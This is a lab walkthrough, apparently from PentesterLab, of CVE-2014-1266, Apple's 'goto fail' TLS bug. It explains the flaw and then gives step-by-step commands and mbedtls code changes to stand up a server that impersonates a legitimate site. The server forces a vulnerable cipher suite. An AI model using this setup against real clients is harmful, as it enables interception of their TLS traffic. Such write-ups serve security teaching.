# CVE_2014-1266

### Diffie-Hellman, x509 verification and chain of trust

As part of a request sent over TLS, before sending the request, the client will make sure that the certificate is valid and is valid for the current hostname. The client also needs to ensure that the server has access to the private key that matches the public key available in the certificate. This can be done in multiple ways:

* By encrypting the communication key with the public key. The server will only be able to decrypt the key (and therefore keep the communication going) if it has access to the private key associated with the public key in the certificate.
* By getting the server to sign some data with the private key associated with the public key available in the certificate.

### Vulnerability

The vulnerability CVE-2014-1266 is a vulnerability impacting the iOS  and OSX TLS stack. The issue was caused by a duplicate line inside the  source code  (http://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c?txt)

```c
if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
  goto fail;
  goto fail;
```

This will cause the code to always go to `fail` when  computing the SHA1 to ensure that the signature is correct.  Unfortunately, this causes the client to accept any private key as part  of the key exchange. The variable `err` contains a successful value since it's only computing a hash, therefore the signature  verification is bypassed. Even if the private key presented by the  server does not match the public key available in the certificate, the  application will accept it. To exploit this issue we will need our  malicious server to force the client to use one of the vulnerable  cipher. 

### Exploiting this issue

To exploit this issue, two steps are required:

- Get the certificate from the legitimate server and generating a private key.
- Setting up a TLS server that will present the legitimate certificate chain with an invalid private key. This server will also need to force  the cipher suite to ensure the client uses the vulnerable one.

### Download Legitimate server Certificate

* from tcpdump we get that the client is visiting `pentesterlab.com` so we'll download its certificate chain.

  ```bash
  $ openssl s_client -connect pentesterlab.com:443 -showcerts > myca.pem
  ```

* Now from `myca.pem` we will remove all additional lines between `---END---` of one certificate and `---BEGIN---` of another certificate.

### Setting Up the Server

* To force the cipher suite used by the client, your server needs to  tell the client that it only supports the vulnerable algorithm.  Thankfully, an example for this is available in `programs/ssl/ssl_server2.c`:

  ```c
  [...]
      mbedtls_ssl_conf_ciphersuites( &conf, opt.force_ciphersuite );
  [...]
  ```

  We can just use this and add it to  our `ssl_server.c`.

  

  You can define your own `force_ciphersuite` in the first lines of the `main` function as:

  ```c
  [...]
    int force_ciphersuite[2];
  [...]
  ```

  We just need to find the right value to force one of the vulnerable cipher suites. For example, we can use `TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA` (`0xC014`):

  ```c
    force_ciphersuite[0] = 0xC014;
  ```

  If you are not familiar with C programming. These additions have to be done in the first lines of the `int main( void )` function. 

  And finally, add the line from `ssl_server2.c` (without the `opt.`):

  ```c
  [...]
    mbedtls_ssl_conf_ciphersuites( &conf, force_ciphersuite );
  [...]
  ```

* Once you performed these modifications, you need to recompile the code:

  ```bash
  $ make
  ```

  You should now be able to present your malicious chain to legitimate clients by running the server:

  ```bash
  $ ./programs/ssl/ssl_server
  ```